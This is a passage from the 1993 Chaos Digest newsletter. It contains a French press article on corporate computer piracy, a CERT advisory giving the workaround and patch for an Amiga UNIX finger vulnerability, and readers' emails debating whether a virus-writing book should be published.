 191. TeXMaG . . . . . . . . . . . . . . . . . . . . . . . . . .138

 192. TeX Publication Distribution List. . . . . . . . . . . . .139

 193. TidBITS. . . . . . . . . . . . . . . . . . . . . . . . . .140

 194. TREK-REVIEW-L. . . . . . . . . . . . . . . . . . . . . . .140

 195. Tunisian Scientific Society Newsletter . . . . . . . . . .140

 198. University of Missouri - Columbia Campus Computing
      Newsletter . . . . . . . . . . . . . . . . . . . . . . . .142

 199. Unplastic News . . . . . . . . . . . . . . . . . . . . . .142

 200. Week in Germany. . . . . . . . . . . . . . . . . . . . . .142

 201. World View Magazine. . . . . . . . . . . . . . . . . . . .143

 Section Three:
Selected Network Guides and Useful Information Files . . . . . .143

       General Information Documents About the Net . . . . . . .143
       Selected Network User Guides. . . . . . . . . . . . . . .146
       System-Specific Guides. . . . . . . . . . . . . . . . . .147
       Print Books About the Net . . . . . . . . . . . . . . . .148
       Print Magazines About the Net . . . . . . . . . . . . . .149
       Hypertext Guides to the Net . . . . . . . . . . . . . . .150


Michael Strangelove
Department of Religious Studies
University of Ottawa

         BITNET: 441495@Uottawa
         Internet: 441495@Acadvm1.Uottawa.CA
         S-Mail: 177 Waller, Ottawa, Ontario, K1N 6N5 CANADA
         Voice:  (613) 747-0642
         FAX:    (613) 564-6641

[MODERATEUR: Pour obtenir une version de ce repertoire, il suffit d'envoyer
a  LISTSERV@acadvm1.uottawa.ca, un message contenant les deux lignes:
         get ejournl1 directry
         get ejournl2.directry
Vous obtiendrez alors deux fichiers ASCII de 109821 et 132937 caracteres.]

------------------------------

Date: Mon Mar 22 10:16:00 EST 1993
From: patt@SQUID.TRAM.COM (Patt Bromberger )
Subject: File 2--Piratage a la francaise (reprint)
Copyright: Paul Loubiere, Liberation, 1993


                        La Micro sourit aux pirates

Les entreprises ont de plus en plus de mal a verouiller leurs systemes: l'an
dernier, le cout du piratage s'est eleve a plusieurs milliards de francs.

     "Tiens, ils ont oublie de verouiller mes acces... Je vais visiter. "La
commence la mesaventure d'un cadre, appelons-le Xavier, tout juste embauche
dans une grande compagnie d'assurances.  On lui montre son bureau, son
ordinateur relie aux autres machines de l'entreprise, et on le presente aux
membres du personnel.  Le pot de bienvenue est un succes, tout s'annonce
pour le mieux.  C'est alors que le diable qui sommeille dans chaque puce
decide de frapper.  D'abord, on oublie de verouiller les acces de Xavier aux
donnees sensibles du systeme informatique: il se retrouve dans la situation
d'un employe a qui on aurait donne un passe-partout lui permettant d'ouvrir
toutes les portes.  Mais voila, Xavier est aussi, a ses moments perdus, un
amateur de bits et d'octets.  Il commence a explorer le systeme.  Au hasard
de ses peregrinations, il tombe sur les feuilles de payes de la direction.
Et ne peut resister a l'envie de les imprimer puis de les placarder sur les
murs de l'entreprise.  La plaisanterie ne fut pas du gout de tout le monde,
et Xavier fut sechement remercie.

     Cas exemplaire mais isole?  Pas tout a fait. Temoin, l'affluence au
salon Infosec, qui se tenait la semaine derniere au Cnit de La Defense et
proposait toute une gamme de solutions pour eviter ce genre de desagrements.
Car la securite n'a pas suivi les progres de l'informatique.  Bien rodee a
la fin des annees 80, elle est en recul depuis trois ans.  Et pas a cause
de la negligence des utilisateurs ou des responsables.  Le mal evolue avec
l'informatique: les entreprises veulent maintenant des ordinateurs relies
entre eux par des reseaux locaux qui ne sont plus organises autour d'un
grand systeme.

     "Autrefois, c'etait un peu l'epoque sovietique, plaisante Olivier
Lecorre, un directeur informatique.  Un ordinateur central controlait tout.
Rien ne pouvait entrer ou sortir de la machine sans en referer a l'autorite."
Pas question pour un non-specialiste de s'aprocher d'un ecran
ou d'un clavier.  Les perturbations commencent avec l'arrivee de la micro-
informatique.  "Tout d'un coup, l'omnipotence du technicien etait battue en
breche, reprend Olivier Lecorre.  N'importe quel utilisateur faisait ce
qu'il voulait!".  Tout change encore quand la puissance des micros commence
a concurencer celle des grosses machines.

     Et pourtant, l'evolution est inevitable.  "C'est un peu le probleme de
la contrebande, remarque un specialiste de la securite.  Si les frontieres
sont etanches, c'est qu'il n'y a pas d'echanges avec l'exterieur.  Au
contraire, plus le commerce augmente, plus il est facile de faire passer
n'importe quoi d'un pays a l'autre.  C'est pareil ici: l'augmentation des
echanges informatiques produit mecaniquement une augmentation des risques."
En outre, la communication avec l'exterieur produit un deuxieme phenomene:
l'informatique de papa, avec son grand systeme et ses machines enfermees
dans des bunkers accessibles a un petit nombre d'employes pouvait etre
efficacement centralisee.  Mais la communication est aujourd'hui globale,
avec tout un chacun, par le truchement de reseaux de fibre optique, du
telephone et du modem hertzien (qui permet d'expedier des donnees
informatiques alors qu'on pianote sur son portable confortablement vautre
dans son siege de TGV).  "On peut structurer la police dans un seul pays,
soupire le specialiste de la securite, mais comment voulez-vous organiser
une police mondiale?  Resultat: des systemes differents, avec des regles de
securite differents--parfois incompatibles--sont connectes les uns avec les
autres.  Bref, c'est la pagaille."

     Une pagaille qui coute cher.  La France a perdu 10 milliards de francs
en 1992 a cause de son informatique, d'apres le Club de la securite
informatique francais (Clusif).  Les erreurs d'utilisation (saisie et
transmission des donnees) ont coute 1,9 milliards (18% du total).  Les
accidents (incendie, explosion, implosion...) ont coute 2,62 milliards (25%).
Enfin, la malveillance (vol, utilisation non autorisee des ressources
du systeme pouvant conduire a des detournements de fonds, sabotage) se
taille la part du lion avec 5,9 milliards (57%).

     "C'est simple, explique un informaticien de Thomson Digital Image, je
debranche systematiquement mon modem quand je ne l'utilise pas.  Sinon, je
risque de me faire piquer les informations contenues dans ma station de
travail."  La fraude est simple: il suffit de se connecter par telephone
avec l'ordinateur qu'on veut visiter.  Avec un peu d'habilete, on peut
parfois arriver a penetrer dans le systeme et a voler les informations qu'il
contient.  Des entreprises ont ainsi perdu des marches a cause du vol de la
liste des clients.  D'autres ont rate des marches parce qu'un concurent peu
scrupuleux a fait disparaitre des donnees cruciales. Le miracle de l'echange
de donnees peut aussi etre responsable de catastrophe. Un promoteur avait
l'habitude d'expedier electroniquement ses commandes de materiel.  Un
saboteur a maquille les instructions concernant le choix fait par les
clients des types de moquette a poser.  Bilan: 1,5 million de francs de
pertes.

------------------------------

Date: Thu Feb 18 10:51:20 EST 1993
From: cert-advisory-request@cert.org (CERT Advisory )
Subject: File 3--Vulnerabilite du finger Unix chez Commodore Amiga

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
CA-93:04a                     CERT Advisory
                            February 18, 1993
      REVISION NOTICE: Commodore Amiga UNIX finger Vulnerability
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

               *** THIS IS A REVISED CERT ADVISORY ***
               *** IT CONTAINS UPDATED INFORMATION ***

The CERT Coordination Center has received information concerning a
vulnerability in the "finger" program of Commodore Business Machine's
Amiga UNIX product.  The vulnerability affects Commodore Amiga UNIX
versions 1.1, 2.03, 2.1, 2.1p1, 2.1p2, and 2.1p2a.  Commodore is aware
of the vulnerability, and both a workaround and a patch are available.
Affected sites should apply either the workaround or the patch, and
directions are provided below.

The Commodore contact e-mail address given in CERT Advisory CA-93:04
was incorrect.  This revised advisory provides the correct e-mail
address.  If you have any further questions, contact David Miller of
Commodore via e-mail at davidm@commodore.com.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

I.    Description

      The "finger" command in Amiga UNIX contains a security
      vulnerability.


II.   Impact

      Non-privileged users can gain unauthorized access to files.


III.  Solution

      Commodore has suggested a workaround and a patch, as follows:

      A. Workaround

         As root, modify the permission of the existing /usr/bin/finger
         to prevent misuse.

                # /bin/chmod 0755 /usr/bin/finger

      B. Patch

         As root, install the "pubsrc" package from the distribution tape.

         In the file, "/usr/src/pub/cmd/finger/src/finger.c", add the line:

                setuid(getuid());

         immediately before the line reading:

                display_finger(finger_list);

         (Optionally) save a copy of the existing /usr/bin/finger and modify
         its permission to prevent misuse.

                # /bin/mv /usr/bin/finger /usr/bin/finger.orig
                # /bin/chmod 0755 /usr/bin/finger.orig

         In the directory, "/usr/src/pub/cmd/finger", issue the command:

                # cd /usr/src/pub/cmd/finger
                # make install
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
The CERT Coordination Center wishes to thank Commodore Business
Machines for their response to this problem.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

CERT Coordination Center
Software Engineering Institute
Carnegie Mellon University
Pittsburgh, PA 15213-3890

Internet E-mail: cert@cert.org
Telephone: 412-268-7090 (24-hour hotline)
           CERT personnel answer 7:30 a.m.-6:00 p.m. EST(GMT-5)/EDT(GMT-4),
           on call for emergencies during other hours.

[MODERATEUR: J'ai essaye de joindre le P-DG de Commodore France, M. Georges
Fournay. M. Nicolas Costes nous a confesse que "ce probleme etait deja connu
et que l'etat major europeen avait ete averti.  Toutes les machines seront
desormais modifiees, mais il n'y a rien a craindre pour l'instant.  Aucun
incident n'a jamais eclate sur l'Unix, ce qui nous a permis de supprimer le
poste de responsable Unix.  Si nous avons parler d'Unix, ce n'etait que pour
une raison publicitaire.  Enfin, la solution du CERT est mauvaise:
desactiver le finger de la sorte, c'est catastrophique!"

------------------------------

End of Chaos Digest #1.15
************************************

Chaos Digest               Lundi 29 Mars 1993          Volume 1 : Numero 16

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.16 (29 Mars 1993)
File 1--Reactions sur "C'est decide! J'ecris mon virus" (Re: #1.01)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from cccf@altern.com. The editors may be contacted by
voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at: Jean-Bernard
Condat, Chaos Computer Club France [CCCF], B.P. 155, 93404 St-Ouen Cedex,
France

Issues of ChaosD can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

Issues of ChaosD can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:
CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Wed Mar 24 15:03:59 CDT 1993
From: patt@SQUID.TRAM.COM (Patt Bromberger )
Subject: File 1--Reactions sur "C'est decide! J'ecris mon virus" (Re: #1.01)


                        DON'T SHOW THE DIRECT CODE

Date: Thu Oct 29 11:06:36 MET 1992
From: nkolte@daimi.aau.dk (Nikolaj )

Why publish a book where you show people to write virus, this would only get
more viruses going and eventhough that most of them aren't doint any damage,
the still is a pain in the a... - costing hours of labour to disinfect.

But the concept behind how a virus works is very intereting and can find
usage in modern network and update programs.  Why not put emplasis on that
isue and tell about how to write selfrep. code, but NOT show the direct code
of the most common virusses


                            COOK BOOK SOLUTION

Date: Mon Nov  2 08:27:18 -0500 1992
From: ajalbert@watson.eece.maine.edu (Anthony J. Albert )

  Interesting.  But all in all, I hold the opinion that _someone_ will
always wish to destroy what others have... be it a nation's territory or a
person/ company's data.  The only way to curb this tendancy is through the
education of the young.

  Also, this book might contain a "cook book solution" to write your very
own virus.  However, there still is a step between theory and practice.  If
what the CCCF says is true, that the viruses described in this book can be
defeated by any anti-viral program, then most people who read this book
will _maybe_ write one, then destroy it.  If there is no challenge to the
process of writing it, that will dissuade many people from bothering, IMHO.

  The few that will try to go beyond what the book teaches, and build a
better virus, are the people that, again IMHO, would probably have tried to
do it anyway.  All the book would do is enable them to skip the first few
steps. Possibly this is even for the better, as they might create _less_
effective viri than if they _had_ taught themselves from the ground up.

  I think the main problem still lies in the need to teach the sanctity of
property to children.  If that lesson is learned early, then some of the
destructive tendancies that exist in today's societies might be curbed.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Anthony J. Albert                |Usenet is distributed network anarchy
                                 |at its best--or worst, depending on
ajalbert@watson.eece.maine.edu   |what is posted on any perticular day.
io00038@maine.maine.edu          |            --David Fielder in _Byte_
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


                     YOU KNOW THE CONSEQUENCE

Date: Fri Nov 13 15:23:05 -0800 1992
From: paul_rolland@gateway.qm.apple.com ("Paul Rolland" )

This opinion seems to be correct as long as only Personal Computers are
invloved.  I.m not sure it's true that most of the 1,500 known viruses can
be easily defeated, but I know this is true only for PCs or MAC. For Unix
stations, this is no more true !

Concerning networks, in France, this is not yet something usual. But it's
more and more present in enterprise, and often machines that are on these
networks are differents.  No one knows what is the result of the attack of
a Unix virus on a PC or vise-versa. But the worst point is to consider that
because many viruses aren't destructive, viruses are not dangerous.

FALSE !!! For an enterprise, a virus, even non desctructive, that will
prevent machine from working can mean a lig loss of money, and so on ! Not
only data is important, but the availability of these datas and of the
machine.

I'd like to know how such an operation can help knowledge on viruses ! If
you want to progress on understanding viruses, ask people to promise they
will not diffuse viruses, and give them the book, asking them to develop a
virus. I.m sure that some of them will be able to write one that will not be
detected (or at least corrected) by classical anti-viruses. I'm personnaly
interested in such an experiment, and if you need my help, please contact me

This is exactly what will inspire most people wishing to develop a virus but
having not enough knoledge on ASM programming to do it. But even worse, all
the one that have good knowledge will be able to extract from such a book
all what is interesting and write some more powerful code. If you really
want to publish a book about viruses, you *SHOULD NOT* give a single piece
of code in an existing language for an existing computer that people could
reuse !!!!

Seriously, do you think this is enough to prevent unresponsible adult to
misuse such a book ? Are you sure people writing viruses are all under 18?
It is true that no law can prevent such a publication, but in fact no one
can prevent people from using what is in such a book, and that is the real
problem.

If CCCF really want to publish such a book, it'd better experiment to
consequence of such a publication ! I'm ready to develop some piece of code
using this book and put it on their computer ! Well, they are sure anti
viruses will remove it and it is non destructive !

Publishing such a book is like giving atomic bombs to Irakians ! You *know*
the consequence, even if you refuse to admit it !

Please do not hesitate to contact me for more information if required !

Paul Rolland
rol@grasp1.univ-lyon1.fr


                        ONE COMPTEMPTABLE ACTION

Date: Sat Nov 14 02:21:09 EST 1992
From: fish@cc.gatech.edu (Fish )

While I obviously have a certain morbid curiosity about the book (since I
am expecting to receive a copy for my opinion), I do think its publication
is  harmful.  To publish it under the guise of public education is
(metaphorically speaking) like driving the wrong way on a one-way highway
and claiming that you are trying to advocate more saftey features in cars.

By publishing actual computer code, and proceding to argue it is benign
seems to almost be arguing that viruses are some misunderstood animal, that
should be encouraged.  I think I would have less contempt for this action if
CCCF had at least claimed that they were publishing it in hopes someone will
be encour- aged to come up with a better virus.

I also find the claim that this book is banned in the US a bit suspicious.
I seem to recall something about a first amendment.

To close, I find CCCF's actions to be contemptable, but I oppose censorship
at any level, and support CCCF's right to publish it.


                            IT's EXTREMELY FOOLISH

Date: Sat Nov 14 18:56:55 PST 1992
From: tck@fold.ucsd.edu (Kevin Marcus )

I think that it's extremely foolish to publish how to write viruses with
code.  _The Black Book of Computer Viruses_ is not the only book which
has source code, but it is the first significant contribution, as it
does contain a few "good" viruses, as in replicators.

Just because it's possible to detect a virus doesn't mean it's a threat!!

And, just because somethign is labeled, "Forbidden for readers not 18
years old," doesn't mean that someone won't get a copy of it!

One may argue that it is possible it will help develope AV programs, but
this is unlikely.  The peopel who can write anti-viral programs are
usually doing so after the virus has been created (with exception to some,
such as Integrity Master).  NOnetheless, the virus must get somewhere before
the AV person gets ahold of it.  If you are capable of writing an AV
program, you can write a virus.  And, there is no reason to tell someone how
to write a virus in the first place.  They should take a programmign class
and figure it out themselves if they want to know.

The book propogates virus creation.  You have clearly never experienced a
damaging virus.  And, just because a virus can be detected and even removed,
doesn't make it no longer a threat.  Example:  What are the most common
viruseS?  Stoned, Jeruslam, Michelangelo.

They all have poor replication methods, are buggy, and they have been easily
removed for some time, yet they are stilla threat.


                     LIKE sex education programs

Date: Sun Nov 15 17:37:58 GMT 1992
From: jd4q+@andrew.cmu.edu (Joe Eddy Demers )

I think that this book will make much less difference in the amount of
viruses out there than most people would think. There are already plenty
of newsletters and underground digests, as well as many 'respectable'
journals that have laready published this information, from several
different perspectives. It is like the controversy over Popular
Science's articles about bugs and other detection and spying devices. If
the information was already available, why not compile and publish it?
Although a lot of harm can come to computer systems through viruses, the
best method of protection is education, not ignorance. That's already
been tried with schools where sex education programs are shot down by
parents, who don't want their children exposed to sex, and don't feel
comfortable with their children knowing, feeling that the more they
know, the more tempted they will be to try it. That is always a risk,
but young adults having safe sex in an intelligent manner is better than
having fewer young adults engaging in sex, when those who do are unsafe
and uneducated. As it is whith viruses. There are potentially quite a
few applications for viruses, although many will border upon many lines
of morality/immorality and priveacy issues. All in all, I would have to
say taht the publishment of any information is generally beneficial,
rather than detrimental, and education is most often the best course of
protection from any threat. Thank you.


                        TO ADD FUEL TO A SMALL FIRE

Date: Mon Nov 16 12:39:42 EDT 1992
From: MURPHY@net2.eos.uoguelph.ca ("Jim Murphy" )

I just receive today via the email jungle but will give you a few comments
below throughout your article. Generally I would have problems with such
material in the press, but anyway...

Today's average has enough to worry about especially if they are really an
average DOS user. Why make their risk to virus attacks even easier! The
average user at my school does very little in general to be protect from
Viruses and only as a result of a few outbreaks have we educated the
masses. It is very frustrating to explain to someone that their software
and their files are no longer available because of a computer virus. All
you seem to be doing is to add fuel to a small fire already burning!

--
Jim Murphy, Graduate Student
School of Engineering, University of Guelph, Guelph, Ontario, CANADA
InterNet : Murphy@Net2.EOS.UoGuelph.Ca    BITNET : UGG00059@UOGUELPH
CompuServe : 76300,254
Ma-Bell Net : Work (519) 824-4120 (ext 4871)    FAX : (519) 836-0227


                 RELEASING A POTENTIALLY DESTRUCTIVE BOOK

Date: Wed Jan  6 10:33:47 EST 1993
From: raphael@ms.uky.edu (Raphael Finkel )

No idea why you sent this article to me, but here is my response:

1.  It is not polite to release code for viruses.  It doesn't do anyone
any good (except the author, through royalties) and has a large potential
for harm.

2.  The article talks about two essentially unrelated issues: (a) Kephart's
study, which I am not familiar with and which seems to report the obvious,
that viruses spread by floppies, and (b) that the computer club is releasing
a potentially destructive book.  I don't know why the article chose to
combine these.  As to (a), the reason viruses don't spread by networks is
that the only computers well connected by networks have reasonable operating
systems.  IBM PCs running MS-DOS are the principal victims of viruses,
primarily because they don't use a reasonable operating system.


                       THIS IS SOMEWHAT CONFUSED

Date: Wed Jan  6 23:13:17 GMT 1993
From: internet!adam.adelaide.edu.au!phil (Phil Kernick )

I will be quite happy to tell you my impressions...

This is somewhat confused.  From the whole article I assumed that we are
talking about viruses specifically for IBM/PCs, and probably the more
general class of trojans, but the comment about "networks" confuses the
issue.

I assume that the journalist did not understand the difference between LANs
and the InterNet, and was trying to make a comment that viruses did not tend
to be distributed over the net (e.g. at FTP sites) but rather by physical
exchange of disks.  I do not know of *any* network viruses - unless you
count Robert Morris' WORM.

It doesn't say what knowledge that this book purports to extoll.

In what way?  I would be somewhat disappointed if such a book were
published, not because I want to supress the information, but more because:

  (a)  Anyone with half a clue can write a virus;
  (b)  If published, many people with *no* clue *will* write a virus.

But this is still like giving a loaded gun to someone and saying "don't use
it".

Generically viruses are a pain, but arguabley if no-one swapped pirated
software then fewer people would be the victims.  I would not support the
publication of such a book.
--
   _-_|\    Phil Kernick                        "Sleep all day,
  /     \   University of Adelaide               Party all night,
  \_.-*_/   E-Mail: phil@adam.adelaide.edu.au    It's fun to be a
       v    Phone:  +61 8 228 5914               Vampire!"


                         THE INFORMATION EXISTS

Date: Sat Jan  9 23:25:47 PST 1993
From: malloy@nprdc.navy.mil (Sean Malloy )

With the increased number of 'file exchange' BBSes across the country,
particularly those that maintain an upload/download ratio, I believe
that three steps may be an unreasonably low number of 'steps',
particularly in the case of infections to programs of obvious utility
or interest, such as virus scanners, archivers, or graphics file
display programs.

If you assume that the person responsible for originating the virus
operates by uploading an infected program to a BBS, it is clear that
there is a minimum of two 'steps' from the originator's system to the
target system. In the case of a local BBS, the infected file may never
leave the city, and is likely to do so only as a result of physical
disk transport, but within that city the spread of the infection is
likely to require no more than three 'steps'.

However, with the availability of files through a worldwide network --
the anonymous FTP archive sites on UseNet -- it is possible for an
infected file to be spread to BBSes in widely scattered cities in only
three 'steps' from the originator's system. Once the infection has
reached a system in a city, it will then be possible to spread within
that city through BBS uploads of infected software. Therefore, I
believe that the question of viral infection should be broken up into
two mostly separate models: infection across nation- or world-wide
networks, and infection within areas where file transfers are mediated
by essentially standalone BBSes.

That a virus is not destructive is not relevant to the problem of
controlling virus infection; any programmer reasonably competent in
assembly language should be able to disassemble a virus, once found
and identified, and replace an innocuous functional tail with a
destructive one.

The information exists, and is already widespread; attempts to control
its spread to/in the U.S. are idiotic, useless, and unconstitutional.
The data describing viral code is neutral; it can be used either to
construct programs to detect viri or to create new viri. Regardless of
the use to which it is put, the information cannot be banned on the
claim that it could be used to write viri, because that constitutes a
prejudgement of guilt; the government must prove that any given
individual _will_ write and spread viri using the information in the
book before the ban may legally be enacted -- U.S. law requires a
presumption of innocence in the absence of proof to the contrary. If I
have a knife, the fact that _some_ people use knives to commit
assaults and murders does not prove that _I_ will commit an assault or
murder with my knife, and the government may not take away my knife
until I demonstrate that I _will_ commit an assault or murder with it.
--
random sig #60:
Sean Malloy                                 | If you know what you're doing,
Navy Personnel Research & Development Center| how long it will take, or how
San Diego, CA 92152-6800                    | much it will cost, it isn't
malloy@nprdc.navy.mil                       | research.


                   crux of mis-representation of viruses

Date: Fri Jan  8 22:54:15 MST 1993
From: thayne@unislc.slc.unisys.com (Thayne Forbes )

This is IMHO the crux of the general mis-representation of viruses.
Specifically, nearly all viruses are on 'micro' computers, and even now
very few of these are networked.  Certainly not to the extent that the
above assumes.  Consequently, much ado about nothing.

And this is the crux of my belief that this is almost not worth my
concern.  In ten years of daily use, I have never been infected.  Only
one person of my acquaintance has ever been infected.  While I have not
made any stupid mistakes to get myself infected, I have not been
particularly careful either.

    This is really an old debate.  You either believe that these should be
kept secret, or that they should be spread as widely as possible.  No one
ever changes anybodies mind about this issue.

    My opinion is that some very bright programmers are writing very cheap
and easy anti-viral software, and thus there is no need to diseminate
the code.

These two excuses are so stupid that I can't believe that anyone seriously
espouses them as reasons to publish.  Sorry, that's how I feel.


                          LET THEM PUBLISH

Date: Fri Jan  8 10:33:58 GMT 1993
From: tih@barsoom.nhh.no (Tom Ivar Helbekkmo )

Sure thing...  I say let them publish.  The information will be spread
anyway, and this way might make it less interesting to many to actually
release viruses, since some of the challenge will be gone.  And in any
case, anyone who uses a personal computer (read "toy"), should be aware
of the virus problem, and if they're stupid enough to run pirated games
and stuff on their machines, that's just too bad.
--
Tom Ivar Helbekkmo, NHH, Bergen, Norway.  Telephone: +47-5-959205
Postmaster for domain nhh.no.   Internet mail: tih@barsoom.nhh.no


                                NO HYSTERIA

Date: Wed Jan  6 19:23:38 EST 1993
From: internet!uunet.UU.NET!jaflrn!jaf (Jon Freivald )

My comments on the content:

I find it old news ("not every machine could make contact..."), or,
rather, a more realistic statement than the picture many visionaries
have tried to paint, as well as a touch alarming (the availability of
the book).  I also find it to be one of the few sensibly written
articles I've seen -- no hype, no doomsaying and no hysteria... just a
simple statement of the facts (& do I sense perhaps just a touch of
sarcastic humor right at the end..?).

My comments on the situation:

I've often commented on the fact that we'll never have all computers
interconnected until it is both as cheap and as easy as plugging in a
telephone...  Until that's the case (and the service is globally
available), you'll have many folks who are content to do the floppy disk
shuffle.  E-mail must also be made much simpler than it is now, with the
equivilant of a phone book available to everyone with minimal resource
usage.  It's just "about time" that IBM and others realize that there
are many, many, many computer users out there who either don't use their
systems for business, or are a small enough business that can't afford
the astronomical costs of their traditional communications solutions.

The availability of the book can be both good and bad.  Bad in the fact
that it makes malicious knowledge generally available.  The "average"
reader is going to read it and pattern his work after what he has
learned, but the exceptional reader is going to get concepts from what
he has learned, ponder the potential, and run with it in his own
direction.  Without the book, the exceptional reader may have never been
drawn down that path..  Where it can be good is that it very well may
establish patterns that can be recognized and dealt with, much in the
way that work from "A Poor Man's James Bond" is easily recognized (and
avoided/disarmed) by many law enforcement and military men...  From that
angle, if the book had been available to me here I might have learned to
recognize some things quicker than the trial & error method I took.

I hope these were the types of opinions you were looking for...  If not,
be a bit more specific & I'll spout off again..! ;-)

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                   Jon Freivald ( jaf%jaflrn@uunet.UU.NET )
         Nothing is impossible for the man who doesn't have to do it.
                    PGP V2 public key available on request
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


                    THE TITLE MAKE ME CRINGE

Date: Sun Dec 13 22:05:39 CST 1992
From: internet!casbah.acns.nwu.edu!jmcadams (James McAdams )

        Well, IMHO, the article is a reasonable mix of hot-air and hysteria.
The viruses are already out there in reasonable quantities, and the problem
is already of a magnitude that everyone should be using some form of anti-
viral defenses.  If you don't, you have little business complaining  about
being infected.  Every virus outbreak I've seen could fairly easily
be traced to risky behavior by someone on the network/machine.

        Besides, any scanner worth the shareware price should be more  "up-
to-date" than a printed book.  The time-scales are quite different.
Being worried about an increase caused by published source code is silly.
Variants exist, and are dealt with adequately.  What people really should
worry about is the people who know enough to write BRAND NEW viruses using
BRAND NEW loopholes! :-)

        I guess my opinion on "should the book be published" is YES!
The potential threats are minor, except for people who can't be worried
to take care of their computer.  The principle of banning "anti-social"
documents and publishing is fundamentally wrong.  Knowledge can NEVER be
dangerous, because for every one person who learns and tries to destroy,
many more learn to create.


                            THE HARD WAY

Date: Fri Nov 13 10:59:00 EST 1992
From: LCHARDON@TrentU.ca (Laurent Chardon )

        You are asking for an opinion, but I'm sory I'm not sure what you
are expecting. What do you want opinion on? The book? The article?
The fact that most viruses don't travel through the nets but by disks?

I will try to give you my humble opinion on the book and the propagation
means of the viruses, but if you don't find my answers satisfying, or if I
didn't answer your question at all, please let me know.

        It is a fact that getting a program from a disk is more dangerous
than getting it from a BBS or a world wide network. Why? First of all, BBS
owners are well aware of the risks (if there is an infected program in
their machine, they will be the first affected...), and in all the BBS I
know, whenever a new file enters the system, it is thoroughly scaned for
viruses. And most people I know double check any program they download.
For some reason, people tend to be less carefull with disks. Usually you
get an infected disk from a friend, and you're not suspicious because you
trust that friend. It is just like with biological sexually transmitted
diseases, your friend might not be aware that he/she is carrying the virus.

        Most people are connected to their local BBS (to avoid long distance
charges, and also because most of them don't have access to internet,
etc...), and IF a virus manages to reach a BBS, it will affect (at first)
the people connecting, i.e. the "locals". The virus then will continue
spreading, but this time by "physical" means. It is the well known
infection, the one for which most personal computers viruses are designed:
disk to disk. This kind of virus is very popular because such programs are
easy to write, and they travel far (see the brain virus etc.) Writing a
virus which propagates efficient on a network requires a good knowledge of
the internals of the net, which most people don't have.  There are also more
security measures on network and mainframe computers.  But then again, if a
virus manages its way through a network, it can spread  very quicly, very
far. Remember RTM ?

        Publishing a book that will help people writting their own virus
will have a nasty effect at first on these computer owners who don't know
anything about viruses. Who will benefit from the book? People who are not
very good programmers. Therefore the viruses they will write will follow
more or less the pattern provided, and therefore they will be easily
detected. A lot more viruses will appear, but the only people who will
catch viruses of this new "breed" are the one who don't use the simple
virus checkers available. Since the awarness of computer users is
increasing, the number of these people is always decreasing, and a couple
thousand of new viruses let free will certainly help this consciousness
rise more (although people will probably learn "the hard way"...)  The
"hackers" that write dangerous viruses (using good stealth techniques, code
that go around software protections etc...) don't need the  book. They won't
benefit from it. Therefore to my opinion, the effect of the book will be
that the weakest machines only will be affected, once. The  victims will
then be more careful.

        In general, I think that the book is a good idea, and I will
probably buy it myself. I don't think it will do much harm, but it will
speed  up things. People who are going to catch viruses because they don't
know about it or they're not careful will do so sooner. They will learn
(hopefully...) and be more cautious in the future.

        I don't know if this is what you were asking. Please tell me if I
have been helpful or not. If I have not, please indicate me how I can be.
I'm also curious on how I ended up on your mailing list. By the way, could
you tell me more about the CCCF ? Merci...
____________________________________________________________________________
Laurent Chardon,    Trent University, Peterborough ONTARIO   CANADA  K9J 7B8
Voice: (705)-749 5022   E-mail: LCHARDON@TRENTU.CA
____________________________________________________________________________


                   I FULLY SUPPORT THIS PUBLICATION

Date: Sat Nov 14 18:10:58 GMT 1992
From: ST1H4@Jetson.UH.EDU

thank you for sending me the responses.  no matter what the general public
believes, i still fully support your publication of the book.  if you need
any help here in the USA just let me know.

keep the faith
sam
---
Judge Dredd
Editor - NIA Magazine
Ignorance, There's No Excuse.

------------------------------

End of Chaos Digest #1.16
************************************

Chaos Digest               Lundi 5 Avril 1993          Volume 1 : Numero 17

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.17 (5 Avril 1993)
File 1--109 Entites reseaux de connectivite internationale
File 2--17th Intl. Online Information Meeting (collaboration)
File 3--Disponibilites des sources en C pour Macintosh de PGP v2.2
File 4--Clef publique PGP v2.1
File 5--Publication scolaire de e-journaux (these)
File 6--Critique de "Rogue Programs", L. Hoffman, ed.

